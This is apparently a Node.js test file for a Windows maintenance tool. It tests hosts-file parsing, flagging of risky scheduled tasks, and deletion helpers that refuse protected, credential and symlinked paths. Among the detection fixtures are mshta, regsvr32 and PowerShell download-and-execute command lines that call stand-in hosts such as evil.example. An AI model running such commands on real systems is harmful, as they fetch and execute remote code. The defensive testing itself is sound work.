'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const hostsFileCheck = require('../src/scripts/safeScripts/hostsFileCheck');
const scheduledTasksReport = require('../src/scripts/safeScripts/scheduledTasksReport');
const deleteFiles = require('../src/scripts/safeScripts/deleteFiles');
const removeLeftovers = require('../src/scripts/safeScripts/removeLeftovers');
const { isProtectedPath, protectedRoots } = require('../src/core/pathSafety');
const legacyProtectedPaths = require('../src/scripts/safeScripts/protectedPaths');

describe('hostsFileCheck parseHostsFile', () => {
  it('skips comments, blank lines, and default entries', () => {
    const content = [
      '# comment',
      '',
      '127.0.0.1 localhost',
      '::1 localhost',
      '255.255.255.255 broadcasthost',
      '0.0.0.0 example.com'
    ].join('\n');
    const entries = hostsFileCheck.parseHostsFile(content);
    assert.equal(entries.length, 1);
    assert.equal(entries[0].host, 'example.com');
  });

  it('flags hosts that redirect security or update domains', () => {
    const content = '0.0.0.0 update.microsoft.com\n10.0.0.5 defender.somewhere.net\n127.0.0.1 games.example.com';
    const entries = hostsFileCheck.parseHostsFile(content);
    const flagged = entries.filter((e) => e.flagged);
    assert.equal(flagged.length, 2, 'update.microsoft.com and defender hit');
    assert.ok(flagged.every((e) => e.flagReason));
  });

  it('handles inline comments and multiple hosts per line', () => {
    const content = '0.0.0.0 site1.example.com site2.example.com # tracking';
    const entries = hostsFileCheck.parseHostsFile(content);
    assert.equal(entries.length, 2);
    assert.deepEqual(entries.map((e) => e.host), ['site1.example.com', 'site2.example.com']);
  });

  it('reports supported:false for a missing hosts file', async () => {
    const result = await hostsFileCheck('C:\\definitely\\missing\\hosts');
    assert.equal(result.supported, false);
  });

  it('caps returned entries while keeping the full count', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hosts-'));
    try {
      const hostsPath = path.join(dir, 'hosts');
      const lines = [];
      for (let i = 0; i < 1200; i++) lines.push(`0.0.0.0 host${i}.example.com`);
      fs.writeFileSync(hostsPath, lines.join('\n'));

      const result = await hostsFileCheck(hostsPath);
      assert.equal(result.entryCount, 1200, 'full count reported');
      assert.equal(result.entries.length, 500, 'render-bound entries capped');
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('scheduledTasksReport actionLooksRisky', () => {
  it('flags actions running from world-writable or temp locations', () => {
    for (const action of [
      'C:\\Windows\\Temp\\payload.exe',
      'C:\\Users\\a\\AppData\\Roaming\\x.exe',
      'C:\\Users\\a\\AppData\\Local\\Temp\\x.exe',
      'C:\\Users\\Public\\x.exe'
    ]) {
      const risk = scheduledTasksReport.actionLooksRisky(action);
      assert.equal(risk.flagged, true, action);
      assert.ok(risk.reason);
    }
  });

  it('does not flag ProgramData actions (legit updater tasks live there)', () => {
    const risk = scheduledTasksReport.actionLooksRisky('C:\\ProgramData\\SomeApp\\updater.exe');
    assert.equal(risk.flagged, false);
  });

  it('does not flag a plain PowerShell invocation', () => {
    const risk = scheduledTasksReport.actionLooksRisky('powershell.exe -File "C:\\Program Files\\MyApp\\maintenance.ps1"');
    assert.equal(risk.flagged, false);
  });

  it('flags script hosts invoked with obfuscated or remote arguments', () => {
    for (const action of [
      'powershell.exe -EncodedCommand SQBFAFgA',
      'mshta.exe http://evil.example/payload.hta',
      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "',
      'regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll',
      'powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString(\'http://x/y\')"'
    ]) {
      const risk = scheduledTasksReport.actionLooksRisky(action);
      assert.equal(risk.flagged, true, action);
      assert.ok(risk.reason);
    }
  });

  it('returns not flagged for empty or missing actions', () => {
    assert.equal(scheduledTasksReport.actionLooksRisky(null).flagged, false);
    assert.equal(scheduledTasksReport.actionLooksRisky('').flagged, false);
  });
});

describe('deleteFiles shared path safety (#147)', () => {
  function useFakeAppData() {
    const prev = { APPDATA: process.env.APPDATA, LOCALAPPDATA: process.env.LOCALAPPDATA };
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-appdata-'));
    const roaming = path.join(root, 'Roaming');
    const local = path.join(root, 'Local');
    fs.mkdirSync(roaming, { recursive: true });
    fs.mkdirSync(local, { recursive: true });
    process.env.APPDATA = roaming;
    process.env.LOCALAPPDATA = local;
    return {
      root, roaming, local,
      restore() {
        if (prev.APPDATA === undefined) delete process.env.APPDATA;
        else process.env.APPDATA = prev.APPDATA;
        if (prev.LOCALAPPDATA === undefined) delete process.env.LOCALAPPDATA;
        else process.env.LOCALAPPDATA = prev.LOCALAPPDATA;
        fs.rmSync(root, { recursive: true, force: true });
      }
    };
  }

  function makeTempFile(dir, name, content) {
    const filePath = path.join(dir, name);
    fs.writeFileSync(filePath, content);
    return filePath;
  }

  it('deletes a valid temp file with accurate accounting', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-del-'));
    try {
      const content = 'x'.repeat(1234);
      const filePath = makeTempFile(dir, 'old.tmp', content);
      const result = await deleteFiles({ paths: [filePath] });
      assert.equal(result.deletedCount, 1);
      assert.equal(result.skippedCount, 0);
      assert.equal(result.freedBytes, 1234);
      assert.equal(result.freedMB, +(1234 / 1e6).toFixed(2));
      assert.equal(fs.existsSync(filePath), false);
      assert.deepEqual(Object.keys(result).sort(), ['deletedCount', 'freedBytes', 'freedMB', 'log', 'skippedCount']);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('deletes a normal AppData maintenance file (no blanket AppData ban)', async () => {
    const fake = useFakeAppData();
    try {
      const cacheDir = path.join(fake.local, 'SomeVendor', 'Cache');
      fs.mkdirSync(cacheDir, { recursive: true });
      const filePath = makeTempFile(cacheDir, 'old.tmp', 'cached');
      const result = await deleteFiles({ paths: [filePath] });
      assert.equal(result.deletedCount, 1);
      assert.equal(fs.existsSync(filePath), false);
    } finally {
      fake.restore();
    }
  });

  it('refuses a protected system path without touching it', async () => {
    const systemRoot = protectedRoots()[0];
    const probe = path.join(systemRoot, 'soterios-probe.tmp');
    assert.equal(isProtectedPath(probe), true, 'test precondition: probe is shared-protected');
    const result = await deleteFiles({ paths: [probe] });
    assert.equal(result.deletedCount, 0);
    assert.equal(result.skippedCount, 1);
    assert.match(result.log.join('\n'), /protected/);
  });

  it('refuses credential-sensitive paths the legacy gate allowed', async () => {
    const credFile = path.join(os.homedir(), '.ssh', 'id_rsa');
    assert.equal(isProtectedPath(credFile), true, 'shared policy protects the credential path');
    if (process.platform === 'win32') {
      assert.equal(legacyProtectedPaths.isProtected(credFile), false, 'legacy gate would have allowed it');
    }
    const result = await deleteFiles({ paths: [credFile] });
    assert.equal(result.deletedCount, 0);
    assert.equal(result.skippedCount, 1);
    assert.match(result.log.join('\n'), /protected/);
  });

  it('refuses Soterios application-data files', async () => {
    const fake = useFakeAppData();
    try {
      const appDir = path.join(fake.local, 'Soterios', 'scan-reports');
      fs.mkdirSync(appDir, { recursive: true });
      const filePath = makeTempFile(appDir, 'report.json', '{}');
      const result = await deleteFiles({ paths: [filePath] });
      assert.equal(result.deletedCount, 0);
      assert.equal(result.skippedCount, 1);
      assert.match(result.log.join('\n'), /protected/);
      assert.equal(fs.existsSync(filePath), true, 'protected file is preserved');
    } finally {
      fake.restore();
    }
  });

  it('refuses files reached through a symlink ancestor and preserves the target', async (t) => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-traverse-'));
    try {
      const safeRoot = path.join(base, 'safe');
      const external = path.join(base, 'external');
      fs.mkdirSync(safeRoot, { recursive: true });
      fs.mkdirSync(external, { recursive: true });
      const victim = makeTempFile(external, 'victim.txt', 'precious');
      const link = path.join(safeRoot, 'linked-parent');
      try {
        fs.symlinkSync(external, link, 'junction');
      } catch (err) {
        t.skip(`symlink creation unsupported in this environment: ${err.code || err.message}`);
        return;
      }
      const result = await deleteFiles({ paths: [path.join(link, 'victim.txt')] });
      assert.equal(result.deletedCount, 0);
      assert.equal(result.skippedCount, 1);
      assert.match(result.log.join('\n'), /reparse-or-symlink/);
      assert.equal(fs.existsSync(victim), true, 'external target is preserved');
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  it('refuses a target that is itself a symlink', async (t) => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-targetlink-'));
    try {
      const external = path.join(base, 'external');
      fs.mkdirSync(external, { recursive: true });
      const victim = makeTempFile(external, 'victim.txt', 'precious');
      const link = path.join(base, 'evil-link.txt');
      try {
        fs.symlinkSync(victim, link, 'file');
      } catch (err) {
        t.skip(`file symlink creation unsupported in this environment: ${err.code || err.message}`);
        return;
      }
      const result = await deleteFiles({ paths: [link] });
      assert.equal(result.deletedCount, 0);
      assert.match(result.log.join('\n'), /reparse-or-symlink/);
      assert.equal(fs.existsSync(victim), true);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  it('refuses a target that reports as a symlink even if swapped in late', async () => {
    // Deterministic TOCTOU coverage: the target looks like a regular file
    // during shared assessment but reports as a link when the script
    // inspects it just before deletion. Only this path is affected.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-lateswap-'));
    try {
      const filePath = makeTempFile(dir, 'swap.tmp', 'precious');
      const resolved = path.resolve(filePath);
      const realLstat = fs.lstatSync;
      let inspections = 0;
      fs.lstatSync = (target, ...rest) => {
        const stat = realLstat(target, ...rest);
        // The first inspection of this path belongs to shared assessment
        // (which must pass for this test); later ones belong to the script.
        if (path.resolve(target) === resolved && ++inspections > 1) {
          return { ...stat, isSymbolicLink: () => true, isFile: () => false, isDirectory: () => false };
        }
        return stat;
      };
      let result;
      try {
        result = await deleteFiles({ paths: [filePath] });
      } finally {
        fs.lstatSync = realLstat;
      }
      assert.equal(fs.lstatSync, realLstat, 'fs stub is always restored');
      assert.ok(inspections > 1, 'script inspected the target after assessment');
      assert.equal(result.deletedCount, 0);
      assert.match(result.log.join('\n'), /reparse-or-symlink/);
      assert.equal(fs.existsSync(filePath), true, 'swapped target is preserved');
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });

  it('refuses paths outside approved maintenance roots', async () => {
    const outside = path.join(path.parse(os.tmpdir()).root, 'soterios-outside-probe.tmp');
    const result = await deleteFiles({ paths: [outside] });
    assert.equal(result.deletedCount, 0);
    assert.equal(result.skippedCount, 1);
    assert.match(result.log.join('\n'), /outside-approved-roots/);
  });

  it('skips non-files and missing paths cleanly', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-deltype-'));
    try {
      const missing = path.join(dir, 'gone.tmp');
      const result = await deleteFiles({ paths: [dir, missing, null, 42] });
      assert.equal(result.deletedCount, 0);
      assert.equal(result.skippedCount, 4);
      assert.match(result.log.join('\n'), /not a file/);
      assert.match(result.log.join('\n'), /not found/);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('removeLeftovers shared path safety (#147)', () => {
  function useFakeAppData() {
    const prev = { APPDATA: process.env.APPDATA, LOCALAPPDATA: process.env.LOCALAPPDATA, ProgramData: process.env.ProgramData };
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-appdata-'));
    const roaming = path.join(root, 'Roaming');
    const local = path.join(root, 'Local');
    fs.mkdirSync(roaming, { recursive: true });
    fs.mkdirSync(local, { recursive: true });
    process.env.APPDATA = roaming;
    process.env.LOCALAPPDATA = local;
    return {
      root, roaming, local,
      restore() {
        if (prev.APPDATA === undefined) delete process.env.APPDATA;
        else process.env.APPDATA = prev.APPDATA;
        if (prev.LOCALAPPDATA === undefined) delete process.env.LOCALAPPDATA;
        else process.env.LOCALAPPDATA = prev.LOCALAPPDATA;
        if (prev.ProgramData === undefined) delete process.env.ProgramData;
        else process.env.ProgramData = prev.ProgramData;
        fs.rmSync(root, { recursive: true, force: true });
      }
    };
  }

  it('dry-runs a valid AppData leftover without mutating', async () => {
    const fake = useFakeAppData();
    try {
      const leftover = path.join(fake.local, 'SomeUninstalledApp');
      fs.mkdirSync(leftover, { recursive: true });
      fs.writeFileSync(path.join(leftover, 'data.bin'), 'x');
      const result = await removeLeftovers({ paths: [leftover] });
      assert.equal(result.dryRun, true);
      assert.equal(result.removedCount, 1);
      assert.equal(result.removed[0].dryRun, true);
      assert.match(result.log.join('\n'), /Would remove/);
      assert.equal(fs.existsSync(leftover), true, 'dry run mutates nothing');
      assert.deepEqual(Object.keys(result).sort(), ['dryRun', 'log', 'removed', 'removedCount', 'skipped', 'skippedCount']);
    } finally {
      fake.restore();
    }
  });

  it('removes a valid AppData leftover when dryRun is false', async () => {
    const fake = useFakeAppData();
    try {
      const leftover = path.join(fake.roaming, 'SomeUninstalledApp');
      fs.mkdirSync(leftover, { recursive: true });
      fs.writeFileSync(path.join(leftover, 'data.bin'), 'x');
      const result = await removeLeftovers({ paths: [leftover], dryRun: false });
      assert.equal(result.removedCount, 1);
      assert.equal(result.skippedCount, 0);
      assert.equal(fs.existsSync(leftover), false);
    } finally {
      fake.restore();
    }
  });

  it('removes a valid temp maintenance directory', async () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-leftover-'));
    try {
      const leftover = path.join(base, 'stale-workdir');
      fs.mkdirSync(leftover, { recursive: true });
      const result = await removeLeftovers({ paths: [leftover], dryRun: false });
      assert.equal(result.removedCount, 1);
      assert.equal(fs.existsSync(leftover), false);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  it('refuses credential-sensitive directories in both dry-run and real modes', async () => {
    const credDir = path.join(os.homedir(), '.gnupg');
    assert.equal(isProtectedPath(credDir), true, 'shared policy protects the credential path');
    for (const dryRun of [true, false]) {
      const result = await removeLeftovers({ paths: [credDir], dryRun });
      assert.equal(result.removedCount, 0, `nothing removed in dryRun=${dryRun}`);
      assert.equal(result.skippedCount, 1);
      assert.equal(result.skipped[0].reason, 'protected');
      assert.ok(!result.removed.some((entry) => entry.path === credDir), 'never listed as removable');
    }
  });

  it('refuses ProgramData and system locations per shared policy', async () => {
    const programData = process.env.ProgramData || 'C:\\ProgramData';
    const probe = path.join(programData, 'soterios-probe-dir');
    const systemRoot = protectedRoots()[0];
    const systemProbe = path.join(systemRoot, 'soterios-probe-dir');
    for (const candidate of [probe, systemProbe]) {
      assert.equal(isProtectedPath(candidate), true, `shared policy protects ${candidate}`);
      const result = await removeLeftovers({ paths: [candidate], dryRun: false });
      assert.equal(result.removedCount, 0);
      assert.equal(result.skipped[0].reason, 'protected');
    }
  });

  it('refuses a Soterios application-data directory', async () => {
    const fake = useFakeAppData();
    try {
      const appDir = path.join(fake.roaming, 'Soterios', 'reports');
      fs.mkdirSync(appDir, { recursive: true });
      const result = await removeLeftovers({ paths: [appDir], dryRun: false });
      assert.equal(result.removedCount, 0);
      assert.equal(result.skipped[0].reason, 'protected');
      assert.equal(fs.existsSync(appDir), true, 'protected directory is preserved');
    } finally {
      fake.restore();
    }
  });

  it('refuses directories reached through a symlink ancestor', async (t) => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-dirtraverse-'));
    try {
      const safeRoot = path.join(base, 'safe');
      const external = path.join(base, 'external');
      fs.mkdirSync(path.join(safeRoot, 'normal'), { recursive: true });
      fs.mkdirSync(path.join(external, 'victim-dir'), { recursive: true });
      fs.writeFileSync(path.join(external, 'victim-dir', 'keep.txt'), 'precious');
      const link = path.join(safeRoot, 'normal', 'linked-parent');
      try {
        fs.symlinkSync(external, link, 'junction');
      } catch (err) {
        t.skip(`symlink creation unsupported in this environment: ${err.code || err.message}`);
        return;
      }
      const through = path.join(link, 'victim-dir');
      const result = await removeLeftovers({ paths: [through], dryRun: false });
      assert.equal(result.removedCount, 0);
      assert.equal(result.skipped[0].reason, 'reparse-or-symlink');
      assert.equal(fs.existsSync(path.join(external, 'victim-dir', 'keep.txt')), true);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  it('refuses a target that is itself a symlink', async (t) => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-dirlink-'));
    try {
      const external = path.join(base, 'external');
      fs.mkdirSync(external, { recursive: true });
      const link = path.join(base, 'evil-dir-link');
      try {
        fs.symlinkSync(external, link, 'junction');
      } catch (err) {
        t.skip(`symlink creation unsupported in this environment: ${err.code || err.message}`);
        return;
      }
      const result = await removeLeftovers({ paths: [link], dryRun: false });
      assert.equal(result.removedCount, 0);
      assert.equal(result.skipped[0].reason, 'reparse-or-symlink');
      assert.equal(fs.existsSync(external), true);
    } finally {
      fs.rmSync(base, { recursive: true, force: true });
    }
  });

  it('refuses paths outside approved maintenance roots', async () => {
    const outside = path.join(path.parse(os.tmpdir()).root, 'soterios-outside-dir');
    const result = await removeLeftovers({ paths: [outside], dryRun: false });
    assert.equal(result.removedCount, 0);
    assert.equal(result.skipped[0].reason, 'outside-approved-roots');
  });

  it('skips regular files and missing paths with distinct reasons', async () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'soterios-leftovertype-'));
    try {
      const filePath = path.join(dir, 'note.txt');
      fs.writeFileSync(filePath, 'x');
      const missing = path.join(dir, 'gone');
      const result = await removeLeftovers({ paths: [filePath, missing, null], dryRun: false });
      assert.equal(result.removedCount, 0);
      assert.equal(result.skippedCount, 3);
      assert.deepEqual(result.skipped.map((entry) => entry.reason), ['not-a-directory', 'missing', 'invalid-path']);
    } finally {
      fs.rmSync(dir, { recursive: true, force: true });
    }
  });
});
